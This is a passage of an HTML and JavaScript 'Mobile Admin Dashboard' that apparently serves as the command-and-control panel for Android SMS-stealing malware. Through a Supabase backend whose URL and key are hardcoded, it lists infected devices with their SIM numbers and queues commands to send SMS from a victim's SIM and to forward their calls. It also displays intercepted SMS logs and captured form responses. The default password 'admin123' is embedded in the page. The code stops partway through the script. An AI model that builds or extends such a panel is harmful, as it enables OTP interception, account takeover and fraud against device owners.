<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Admin Dashboard</title>
    <style>
        /* --- AAPKA PURANA DESIGN STYLE (SAME TO SAME) --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        #loginScreen {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        
        .login-icon {
            font-size: 70px;
            color: #667eea;
            margin-bottom: 25px;
        }
        
        .login-title {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .login-subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 16px;
        }
        
        .password-input {
            width: 100%;
            padding: 16px;
            border: 2px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            margin-bottom: 20px;
            outline: none;
        }
        
        .password-input:focus {
            border-color: #667eea;
        }
        
        .login-button {
            width: 100%;
            padding: 16px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        
        .login-button:hover {
            background: #5a6fd8;
        }
        
        .password-info {
            margin-top: 20px;
            color: #888;
            font-size: 14px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
        }
        
        #dashboard {
            display: none;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .dashboard-header {
            background: #667eea;
            color: white;
            padding: 25px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header-left h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .device-count {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .header-buttons {
            display: flex;
            gap: 12px;
        }
        
        .header-btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .change-pass-btn {
            background: #ffd166;
            color: #333;
        }
        
        .logout-btn {
            background: #ef476f;
            color: white;
        }
        
        .devices-section {
            padding: 30px;
        }
        
        .section-title {
            font-size: 22px;
            color: #333;
            margin-bottom: 25px;
        }
        
        .devices-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 25px;
        }
        
        .device-card {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 25px;
            border: 2px solid #e9ecef;
        }
        
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #dee2e6;
        }
        
        .device-info h3 {
            color: #333;
            font-size: 18px;
            margin-bottom: 8px;
        }
        
        .device-status {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 5px;
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        
        .online-dot {
            background: #06d6a0;
        }
        
        .offline-dot {
            background: #ef476f;
        }
        
        .delete-device {
            background: none;
            border: none;
            color: #999;
            cursor: pointer;
            font-size: 18px;
        }
        
        .device-details {
            margin-bottom: 25px;
        }
        
        .detail-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid #e9ecef;
        }
        
        .detail-label {
            color: #666;
            font-size: 14px;
        }
        
        .detail-value {
            color: #333;
            font-weight: 500;
        }
        
        .action-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        
        .action-btn {
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .sms-btn {
            background: #118ab2;
            color: white;
        }
        
        .call-btn {
            background: #ef476f;
            color: white;
        }
        
        .view-sms-btn {
            background: #7209b7;
            color: white;
        }
        
        .view-forms-btn {
            background: #f3722c;
            color: white;
        }
        
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 15px;
            width: 90%;
            max-width: 500px;
            z-index: 1001;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid #dee2e6;
        }
        
        .modal-title {
            font-size: 20px;
            color: #333;
        }
        
        .close-modal {
            background: none;
            border: none;
            font-size: 24px;
            color: #666;
            cursor: pointer;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
        }
        
        .form-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        
        textarea.form-input {
            min-height: 100px;
            resize: vertical;
        }
        
        .modal-footer {
            display: flex;
            justify-content: flex-end;
            gap: 12px;
            margin-top: 25px;
            padding-top: 15px;
            border-top: 2px solid #dee2e6;
        }
        
        .cancel-btn {
            padding: 12px 24px;
            background: #6c757d;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        
        .submit-btn {
            padding: 12px 24px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 10px;
            color: white;
            font-weight: 600;
            z-index: 9999;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .success {
            background: #06d6a0;
        }
        
        .error {
            background: #ef476f;
        }
        
        .info {
            background: #118ab2;
        }
    </style>
    
    <!-- === YEH DONO LINE ZAROORI HAIN === -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
</head>
<body>

<!-- LOGIN SCREEN -->
<div id="loginScreen">
    <div class="login-container">
        <div class="login-icon"><i class="fas fa-shield-alt"></i></div>
        <h1 class="login-title">Admin Dashboard</h1>
        <p class="login-subtitle">Mobile Device Management System</p>
        <input type="password" id="passwordInput" class="password-input" placeholder="Enter admin password" value="admin123">
        <button id="loginButton" class="login-button"><i class="fas fa-sign-in-alt"></i> LOGIN</button>
        <div class="password-info"><i class="fas fa-info-circle"></i> <strong>Default password:</strong> admin123</div>
    </div>
</div>

<!-- DASHBOARD -->
<div id="dashboard">
    <div class="dashboard-header">
        <div class="header-left">
            <h1><i class="fas fa-mobile-alt"></i> Device Manager</h1>
            <p class="device-count" id="deviceCount">Waiting for devices...</p>
        </div>
        <div class="header-buttons">
            <button id="changePasswordBtn" class="header-btn change-pass-btn"><i class="fas fa-key"></i> Change Password</button>
            <button id="logoutBtn" class="header-btn logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</button>
        </div>
    </div>
    <div class="devices-section">
        <h2 class="section-title"><i class="fas fa-list"></i> Connected Devices</h2>
        <div id="devicesContainer" class="devices-grid">
            <p style="text-align: center; color: #666; grid-column: 1 / -1;">Loading...</p>
        </div>
    </div>
</div>

<!-- MODALS -->
<div id="smsModal" class="modal">
    <div class="modal-header">
        <h3 class="modal-title"><i class="fas fa-sms"></i> <span id="smsModalTitle"></span></h3>
        <button class="close-modal" onclick="closeModal('smsModal')">&times;</button>
    </div>
    <div class="form-group"><label class="form-label">Target Phone</label><input type="text" id="targetNumber" class="form-input"></div>
    <div class="form-group"><label class="form-label">User's SIM</label><select id="smsSimSelect" class="form-input"><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
    <div class="form-group"><label class="form-label">Message</label><textarea id="smsMessage" class="form-input" rows="4"></textarea></div>
    <div class="modal-footer"><button class="cancel-btn" onclick="closeModal('smsModal')">Cancel</button><button class="submit-btn" onclick="sendSMS()">Send SMS</button></div>
</div>

<div id="callModal" class="modal">
    <div class="modal-header">
        <h3 class="modal-title"><i class="fas fa-phone-alt"></i> <span id="callModalTitle"></span></h3>
        <button class="close-modal" onclick="closeModal('callModal')">&times;</button>
    </div>
    <div class="form-group"><label class="form-label">User's SIM</label><select id="callSimSelect" class="form-input"><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
    <div class="form-group"><label class="form-label">Forward Calls To</label><input type="text" id="forwardNumber" class="form-input"></div>
    <div class="modal-footer"><button class="submit-btn" onclick="activateCallForward()">Activate</button><button class="cancel-btn" style="background:#ef476f" onclick="deactivateCallForward()">Deactivate</button></div>
</div>

<div id="viewSmsModal" class="modal" style="max-width: 600px;">
    <div class="modal-header"><h3 class="modal-title">SMS Logs</h3><button class="close-modal" onclick="closeModal('viewSmsModal')">&times;</button></div>
    <div id="smsList" style="max-height: 400px; overflow-y: auto;"></div>
</div>

<div id="viewFormsModal" class="modal" style="max-width: 600px;">
    <div class="modal-header"><h3 class="modal-title">Form Responses</h3><button class="close-modal" onclick="closeModal('viewFormsModal')">&times;</button></div>
    <div id="formsList" style="max-height: 400px; overflow-y: auto;"></div>
</div>

<div id="changePasswordModal" class="modal">
    <div class="modal-header"><h3 class="modal-title">Change Password</h3><button class="close-modal" onclick="closeModal('changePasswordModal')">&times;</button></div>
    <div class="form-group"><label class="form-label">New Password</label><input type="password" id="newPassword" class="form-input"></div>
    <div class="modal-footer"><button class="submit-btn" onclick="changeAdminPassword()">Save</button></div>
</div>

<div id="modalOverlay" class="modal-overlay" onclick="closeAllModals()"></div>
<div id="notificationContainer"></div>

<!-- === YEH POORA SCRIPT ZAROORI HAI === -->
<script>
// ================= CONFIG & GLOBALS =================
const SUPABASE_URL = 'https://lcguyfxorfhvpcvnicpa.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxjZ3V5ZnhvcmZodnBjdm5pY3BhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU0Njc2NDksImV4cCI6MjA4MTA0MzY0OX0.mx_3uB_5XMXYb3_at237Ow0AEL8N_FZpF0DHo874VV8';
let ADMIN_PASSWORD = 'admin123';
let currentDeviceId = null;
let supabase = null;

// ================= INITIALIZATION =================
document.addEventListener('DOMContentLoaded', function() {
    if (!window.supabase) {
        document.body.innerHTML = `<div style="text-align:center; padding:50px; color:red;"><h1>Error: Supabase SDK Failed to Load</h1><p>Check your internet connection or if an ad-blocker is blocking scripts.</p></div>`;
        return;
    }
    
    supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
    console.log('Supabase Ready');
    
    const savedPass = localStorage.getItem('admin_password');
    if (savedPass) ADMIN_PASSWORD = savedPass;
    
    setupEventListeners();
    
    if (localStorage.getItem('admin_logged_in') === 'true') {
        showDashboard();
        loadAllData();
        setInterval(loadAllData, 5000); 
    }
});

// ================= EVENT LISTENERS =================
function setupEventListeners() {
    document.getElementById('loginButton').addEventListener('click', handleLogin);
    document.getElementById('passwordInput').addEventListener('keypress', e => { if (e.key === 'Enter') handleLogin(); });
    document.getElementById('logoutBtn').addEventListener('click', handleLogout);
    document.getElementById('changePasswordBtn').addEventListener('click', () => showModal('changePasswordModal'));
}

// ================= LOGIN & UI =================
function handleLogin() {
    const password = document.getElementById('passwordInput').value.trim();
    if (password === ADMIN_PASSWORD) {
        localStorage.setItem('admin_logged_in', 'true');
        showNotification('Login successful!', 'success');
        showDashboard();
        loadAllData();
        setInterval(loadAllData, 5000);
    } else {
        showNotification('Wrong password!', 'error');
    }
}

function showDashboard() {
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
}

// ================= DATA LOADING =================
async function loadAllData() {
    if (!supabase) return;
    try {
        const { data, error } = await supabase.from('devices').select('*').order('last_seen', { ascending: false });
        if (error) throw error;
        displayDevices(data || []);
    } catch (e) {
        console.error('Fetch error:', e);
    }
}

function displayDevices(devices) {
    const container = document.getElementById('devicesContainer');
    document.getElementById('deviceCount').textContent = `${devices.length} devices`;
    if (devices.length === 0) {
        container.innerHTML = `<p style="text-align:center;color:#666;grid-column:1/-1;">No devices connected yet.</p>`;
        return;
    }
    
    container.innerHTML = devices.map(device => {
        const isOnline = (new Date() - new Date(device.last_seen)) / 1000 < 120;
        return `
            <div class="device-card">
                <div class="device-header">
                    <div class="device-info"><h3><i class="fas fa-mobile-alt"></i> ${device.model || 'Unknown'}</h3></div>
                    <span class="status-dot ${isOnline ? 'online-dot' : 'offline-dot'}"></span>
                </div>
                <div class="device-details">
                    <div class="detail-item"><span class="detail-label">Version</span><span class="detail-value">${device.android_version || 'N/A'}</span></div>
                    <div class="detail-item"><span class="detail-label">SIM 1</span><span class="detail-value">${device.sim1_number || 'N/A'}</span></div>
                    <div class="detail-item"><span class="detail-label">SIM 2</span><span class="detail-value">${device.sim2_number || 'N/A'}</span></div>
                    <div class="detail-item"><span class="detail-label">Seen</span><span class="detail-value">${new Date(device.last_seen).toLocaleString()}</span></div>
                </div>
                <div class="action-grid">
                    <button class="action-btn sms-btn" onclick="showSMSModal('${device.device_id}', '${device.model}')"><i class="fas fa-sms"></i> Send SMS</button>
                    <button class="action-btn call-btn" onclick="showCallModal('${device.device_id}', '${device.model}')"><i class="fas fa-phone-alt"></i> Call Fwd</button>
                    <button class="action-btn view-sms-btn" onclick="showViewSmsModal('${device.device_id}')"><i class="fas fa-eye"></i> View SMS</button>
                    <button class="action-btn view-forms-btn" onclick="showViewFormsModal('${device.device_id}')"><i class="fas fa-file-alt"></i> Forms</button>
                </div>
            </div>`;
    }).join('');
}

// ================= COMMANDS =================
async function sendCommand(deviceId, type, payload) {
    try {
        const { error } = await supabase.from('admin_commands').insert([{
            device_id: deviceId,
            command_type: type,
            command_payload: payload,
            status: 'PENDING'
        }]);
        if (error) throw error;
        showNotification('Command Sent!', 'success');
        return true;
    } catch (e) {
        showNotification('Error: ' + e.message, 'error');
        return false;
    }
}

// ================= SMS MODAL & ACTION =================
function showSMSModal(deviceId, deviceName) {
    currentDeviceId = deviceId;
    document.getElementById('smsModalTitle').textContent = `Send SMS via ${deviceName}`;
    showModal('smsModal');
}

async function sendSMS() {
    const payload = {
        phone: document.getElementById('targetNumber').value.trim(),
        message: document.getElementById('smsMessage').value.trim(),
        sim: parseInt(document.getElementById('smsSimSelect').value)
    };
    if (!payload.phone || !payload.message) return showNotification('Fill all fields', 'error');
    if (await sendCommand(currentDeviceId, 'SEND_SMS', payload)) closeModal('smsModal');
}

// ================= CALL FORWARD MODAL & ACTIONS =================
function showCallModal(deviceId, deviceName) {
    currentDeviceId = deviceId;
    document.getElementById('callModalTitle').textContent = `Call Forwarding - ${deviceName}`;
    showModal('callModal');
}

async function activateCallForward() {
    const forwardNumber = document.getElementById('forwardNumber').value.trim();
    if (!forwardNumber) return showNotification('Enter number', 'error');
    const payload = {
        forward_number: forwardNumber,
        sim: parseInt(document.getElementById('callSimSelect').value),
        enable: true
    };
    if (await sendCommand(currentDeviceId, 'CALL_FORWARD', payload)) closeModal('callModal');
}

async function deactivateCallForward() {
    const payload = {
        forward_number: "",
        sim: parseInt(document.getElementById('callSimSelect').value),
        enable: false
    };
    if (await sendCommand(currentDeviceId, 'CALL_FORWARD', payload)) closeModal('callModal');
}

// ================= VIEW LOGS & FORMS =================
async function showViewSmsModal(deviceId) {
    const container = document.getElementById('smsList');
    container.innerHTML = '<p>Loading logs...</p>';
    showModal('viewSmsModal');
    const { data, error } = await supabase.from('sms_logs').select('*').eq('device_id', deviceId).order('received_at', { ascending: false }).limit(20);
    if (data && data.length > 0) {
        container.innerHTML = data.map(sms => `
            <div style="background:#f8f9fa;padding:10px;border-radius:8px;margin-bottom:8px;">
                <div style="font-size:12px;color:#666;"><strong>${sms.sender_number}</strong> - ${new Date(sms.received_at).toLocaleString()}</div>
                <div>${sms.message_body}</div>
            </div>`).join('');
    } else {
        container.innerHTML = '<p>No SMS logs found.</p>';
    }
